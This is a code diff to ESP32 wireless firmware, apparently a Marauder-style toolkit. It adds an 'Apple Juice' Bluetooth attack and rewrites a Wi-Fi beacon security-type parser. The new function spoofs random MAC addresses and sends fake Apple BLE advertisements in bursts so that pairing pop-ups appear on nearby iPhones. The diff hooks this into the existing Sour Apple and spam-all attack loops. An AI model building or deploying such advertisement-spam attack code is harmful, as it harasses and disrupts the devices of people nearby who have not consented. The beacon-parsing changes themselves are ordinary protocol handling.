@@ -2375,7 +2375,8 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color) {
       RunBluetoothScan(scan_mode, color);
     #endif
   }
-  else if (scan_mode == BT_ATTACK_SOUR_APPLE) {
+  else if ((scan_mode == BT_ATTACK_SOUR_APPLE) ||
+           (scan_mode == BT_ATTACK_APPLE_JUICE)) {
     #ifdef HAS_BT
       RunSourApple(scan_mode, color);
     #endif
@@ -2743,6 +2744,7 @@ void WiFiScan::StopScan(uint8_t scan_mode) {
   (currentScanMode == BT_SCAN_FLOCK) ||
   (currentScanMode == BT_SCAN_FLOCK_WARDRIVE) ||
   (currentScanMode == BT_ATTACK_SOUR_APPLE) ||
+  (currentScanMode == BT_ATTACK_APPLE_JUICE) ||
   (currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) ||
   (currentScanMode == BT_ATTACK_SPAM_ALL) ||
   (currentScanMode == BT_ATTACK_SAMSUNG_SPAM) ||
@@ -3197,6 +3199,11 @@ String WiFiScan::security_int_to_string(int security_type) {
       authtype = "[WPA3_PSK]";
       break;
 
+    #ifdef HAS_IDF_3
+    case WIFI_AUTH_WPA3_ENTERPRISE:
+      authtype = "[WPA3]";
+      break;
+    #endif
     case WIFI_AUTH_WPA2_WPA3_PSK:
       authtype = "[WPA2_WPA3_PSK]";
       break;
@@ -4757,6 +4764,45 @@ void WiFiScan::RunPwnScan(uint8_t scan_mode, uint16_t color) {
   initTime = millis();
 }
 
+void WiFiScan::executeAppleJuice() { // Slower version of Sour Apple, pop up device easier
+  #ifdef HAS_BT
+    uint8_t macAddr[6];
+    generateRandomMac(macAddr);
+    this->setBaseMacAddress(macAddr);
+    NimBLEDevice::init("");
+    NimBLEServer *pServer = NimBLEDevice::createServer();
+
+    pAdvertising = pServer->getAdvertising();
+
+    delay(10);
+
+    NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Apple);
+    pAdvertising->setAdvertisementData(advertisementData);
+
+    #ifdef HAS_NIMBLE_2
+      pAdvertising->setConnectableMode((random(2) == 0) ? BLE_GAP_CONN_MODE_NON : BLE_GAP_CONN_MODE_UND);
+      pAdvertising->setDiscoverableMode(random(3));
+      pAdvertising->setMinInterval(0x20);
+      pAdvertising->setMaxInterval(0x20);
+      pAdvertising->setPreferredParams(0x20, 0x20);
+    #else
+      pAdvertising->setMaxInterval(0x20);
+      pAdvertising->setMinInterval(0x20);
+      pAdvertising->setMinPreferred(0x20);
+      pAdvertising->setMaxPreferred(0x20);
+    #endif
+
+    pAdvertising->start();
+    delay(500);
+    pAdvertising->stop();
+
+    delay(10);
+
+    NimBLEDevice::deinit();
+
+  #endif
+}
+
 void WiFiScan::executeSourApple() {
   uint32_t now_time = millis();
   #ifdef HAS_BT
@@ -5450,7 +5496,8 @@ void WiFiScan::RunSourApple(uint8_t scan_mode, uint16_t color) {
       this->setupScanDisplayArea(TFT_BLACK, color);
       #ifdef HAS_FULL_SCREEN
         display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
-        display_obj.tft.drawCentreString("Sour Apple",TFT_WIDTH / 2,16,2);
+        if (scan_mode == BT_ATTACK_SOUR_APPLE)display_obj.tft.drawCentreString("Sour Apple",TFT_WIDTH / 2,16,2);
+        else if (scan_mode == BT_ATTACK_APPLE_JUICE) display_obj.tft.drawCentreString("Apple Juice",TFT_WIDTH / 2,16,2);
       #endif
       #ifdef HAS_ILI9341
         display_obj.touchToExit();
@@ -6220,74 +6267,130 @@ void WiFiScan::apSnifferCallbackFull(void* buf, wifi_promiscuous_pkt_type_t type
 }*/
 
 uint8_t WiFiScan::getSecurityType(const uint8_t* beacon, uint16_t len) {
-  const uint8_t* frame = beacon;
-  const uint8_t* ies = beacon + 36; // Start of tagged parameters
-  uint16_t ies_len = len - 36;
+  if (len < 36) return WIFI_SECURITY_OPEN;
 
-  bool hasRSN = false;
-  bool hasWPA = false;
-  bool hasWEP = false;
-  bool isEnterprise = false;
-  bool isWPA3 = false;
-  bool isWAPI = false;
+    const uint8_t* frame = beacon;
+    const uint8_t* ies = beacon + 36; // Tagged parameters start after fixed 802.11 header
+    uint16_t ies_len = len - 36;
 
-  uint16_t i = 0;
-  while (i + 2 <= ies_len) {
-    uint8_t tag_id = ies[i];
-    uint8_t tag_len = ies[i + 1];
+    bool hasRSN = false;
+    bool hasWPA = false;
+    bool isEnterprise = false;
+    bool isWPA3 = false;
+    bool isWAPI = false;
 
-    if (i + 2 + tag_len > ies_len) break;
+    uint16_t i = 0;
+    while (i + 2 <= ies_len) {
+        uint8_t tag_id  = ies[i];
+        uint8_t tag_len = ies[i + 1];
 
-    const uint8_t* tag_data = ies + i + 2;
+        if (i + 2 + tag_len > ies_len) break; // Malformed IE, stop parsing
 
-    // Check for RSN (WPA2)
-    if (tag_id == 48) {
-      hasRSN = true;
+        const uint8_t* tag_data = ies + i + 2;
 
-      // WPA2-Enterprise usually uses 802.1X AKM (type 1)
-      if (tag_len >= 20 && tag_data[14] == 0x01 && tag_data[15] == 0x00 && tag_data[16] == 0x00 && tag_data[17] == 0x0f && tag_data[18] == 0xac) {
-        isEnterprise = true;
-      }
+        // ── RSN IE (Tag 48) — indicates WPA2/WPA3 ────────────────────
+        if (tag_id == 48) {
+            hasRSN = true;
 
-      // WPA3 typically uses SAE (type 8)
-      if (tag_len >= 20 && tag_data[14] == 0x01 && tag_data[15] == 0x00 && tag_data[16] == 0x00 && tag_data[17] == 0x0f && tag_data[18] == 0xac && tag_data[19] == 0x08) {
-        isWPA3 = true;
-      }
+            // Minimum size to reach AKM list:
+            // version(2) + group cipher(4) + pairwise count(2) + 1 suite(4) + AKM count(2) = 14
+            if (tag_len < 14) { i += 2 + tag_len; continue; }
+
+            // Skip version (2 bytes) and group cipher suite (4 bytes)
+            uint16_t offset = 6;
+
+            // Read pairwise cipher suite count and skip over the entire pairwise list
+            // This offset is dynamic — hardcoding byte 14 is wrong when count > 1
+            uint16_t pw_count = tag_data[offset] | ((uint16_t)tag_data[offset + 1] << 8);
+            offset += 2 + pw_count * 4;
+
+            // Bounds check before reading AKM count
+            if (offset + 2 > tag_len) { i += 2 + tag_len; continue; }
+
+            uint16_t akm_count = tag_data[offset] | ((uint16_t)tag_data[offset + 1] << 8);
+            offset += 2;
+
+            // Iterate over each AKM suite (4 bytes: 3-byte OUI + 1-byte type)
+            for (uint16_t a = 0; a < akm_count; a++) {
+                if (offset + 4 > tag_len) break;
+
+                // OUI 00:0F:AC identifies IEEE 802.11 standard AKM suites
+                bool isIEEE = (tag_data[offset]     == 0x00 &&
+                               tag_data[offset + 1] == 0x0f &&
+                               tag_data[offset + 2] == 0xac);
+
+                uint8_t akmType = tag_data[offset + 3];
+
+                if (isIEEE) {
+                    if (akmType == 1 ||
+                        akmType == 3 ||
+                        akmType == 12 ||
+                        akmType == 13)
+                    isEnterprise = true; // 802.1X authentication (WPA2-Enterprise) | FT over 802.1X | FILS-SHA256 (WPA3-Enterprise) | FILS-SHA384 (WPA3-Enterprise)
+                    if (akmType == 8)  isWPA3 = true;       // SAE (Simultaneous Authentication of Equals) — WPA3-Personal
+                }
+
+                offset += 4;
+            }
+        }
+
+        // ── WPA IE (Tag 221, OUI 00:50:F2:01) — indicates WPA1 ───────
+        else if (tag_id == 221 && tag_len >= 8 &&
+                 tag_data[0] == 0x00 && tag_data[1] == 0x50 &&
+                 tag_data[2] == 0xf2 && tag_data[3] == 0x01) {
+            hasWPA = true;
+
+            if (tag_len < 14) { i += 2 + tag_len; continue; }
+
+            // WPA IE layout: OUI(3) + type(1) + version(2) + group cipher(4) = 10 bytes before pairwise count
+            uint16_t offset = 10;
+            uint16_t pw_count = tag_data[offset] | ((uint16_t)tag_data[offset + 1] << 8);
+            offset += 2 + pw_count * 4;
+
+            if (offset + 2 > tag_len) { i += 2 + tag_len; continue; }
+
+            uint16_t akm_count = tag_data[offset] | ((uint16_t)tag_data[offset + 1] << 8);
+            offset += 2;
+
+            // Check each AKM suite for 802.1X (WPA-Enterprise)
+            for (uint16_t a = 0; a < akm_count; a++) {
+                if (offset + 4 > tag_len) break;
+
+                // OUI 00:50:F2 is Microsoft's OUI used in WPA IE
+                bool isMSOUI = (tag_data[offset]     == 0x00 &&
+                                tag_data[offset + 1] == 0x50 &&
+                                tag_data[offset + 2] == 0xf2);
+
+                if (isMSOUI && tag_data[offset + 3] == 0x01) isEnterprise = true; // AKM type 1 = 802.1X
+
+                offset += 4;
+            }
+        }
+
+        // ── WAPI IE (Tag 68) — Chinese national Wi-Fi security standard ──
+        else if (tag_id == 68) {
+            isWAPI = true;
+        }
+
+        i += 2 + tag_len;
     }
 
-    // Check for WPA (in vendor specific tag)
-    else if (tag_id == 221 && tag_len >= 8 &&
-        tag_data[0] == 0x00 && tag_data[1] == 0x50 && tag_data[2] == 0xF2 && tag_data[3] == 0x01) {
-      hasWPA = true;
+    // ── Security type decision tree (most specific first) ────────────
+    if (isWAPI)                 return WIFI_SECURITY_WAPI;
+    if (isWPA3 && isEnterprise) return WIFI_SECURITY_WPA3_ENTERPRISE;
+    if (isWPA3)                 return WIFI_SECURITY_WPA3;
+    if (hasRSN && isEnterprise) return WIFI_SECURITY_WPA2_ENTERPRISE;
+    if (hasRSN && hasWPA)       return WIFI_SECURITY_WPA_WPA2_MIXED;
+    if (hasRSN)                 return WIFI_SECURITY_WPA2;
+    if (hasWPA)                 return isEnterprise ? WIFI_SECURITY_WPA2_ENTERPRISE
+                                                    : WIFI_SECURITY_WPA;
 
-      // WPA-Enterprise (AKM 1)
-      if (tag_len >= 20 && tag_data[14] == 0x01 && tag_data[15] == 0x00 && tag_data[16] == 0x00 && tag_data[17] == 0x50 && tag_data[18] == 0xf2) {
-        isEnterprise = true;
-      }
-    }
+    // WEP is not advertised via IEs — detected through the Privacy bit (bit 4)
+    // in the Capability Information field at bytes 34-35 (little-endian)
+    uint16_t capab = (uint16_t)frame[34] | ((uint16_t)frame[35] << 8);
+    if (capab & 0x0010) return WIFI_SECURITY_WEP;
 
-    // Check for WAPI (Chinese standard)
-    else if (tag_id == 221 && tag_len >= 4 &&
-        tag_data[0] == 0x00 && tag_data[1] == 0x14 && tag_data[2] == 0x72 && tag_data[3] == 0x01) {
-      isWAPI = true;
-    }
-
-    i += 2 + tag_len;
-  }
-
-  // Decision tree
-  if (isWAPI) return WIFI_SECURITY_WAPI;
-  if (hasRSN && isWPA3) return WIFI_SECURITY_WPA3;
-  if (hasRSN && isEnterprise) return WIFI_SECURITY_WPA2_ENTERPRISE;
-  if (hasRSN && hasWPA) return WIFI_SECURITY_WPA_WPA2_MIXED;
-  if (hasRSN) return WIFI_SECURITY_WPA2;
-  if (hasWPA) return isEnterprise ? WIFI_SECURITY_WPA2_ENTERPRISE : WIFI_SECURITY_WPA;
-  
-  // WEP is identified via capability flags
-  uint16_t capab_info = ((uint16_t)frame[34] << 8) | frame[35];
-  if (capab_info & 0x0010) return WIFI_SECURITY_WEP;
-
-  return WIFI_SECURITY_OPEN;
+    return WIFI_SECURITY_OPEN;
 }
 
 /*void WiFiScan::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
@@ -11553,6 +11656,7 @@ void WiFiScan::main(uint32_t currentTime)
   }
   else if ((currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) ||
            (currentScanMode == BT_ATTACK_SOUR_APPLE) ||
+           (currentScanMode == BT_ATTACK_APPLE_JUICE) ||
            (currentScanMode == BT_ATTACK_SPAM_ALL) ||
            (currentScanMode == BT_ATTACK_SAMSUNG_SPAM) ||
            (currentScanMode == BT_ATTACK_GOOGLE_SPAM) ||
@@ -11589,6 +11693,10 @@ void WiFiScan::main(uint32_t currentTime)
       if ((currentScanMode == BT_ATTACK_SOUR_APPLE) ||
           (currentScanMode == BT_ATTACK_SPAM_ALL))
         this->executeSourApple();
+
+      if ((currentScanMode == BT_ATTACK_APPLE_JUICE) ||
+          (currentScanMode == BT_ATTACK_SPAM_ALL))
+        this->executeAppleJuice();
 
       if ((currentScanMode == BT_ATTACK_FLIPPER_SPAM) ||
           (currentScanMode == BT_ATTACK_SPAM_ALL))
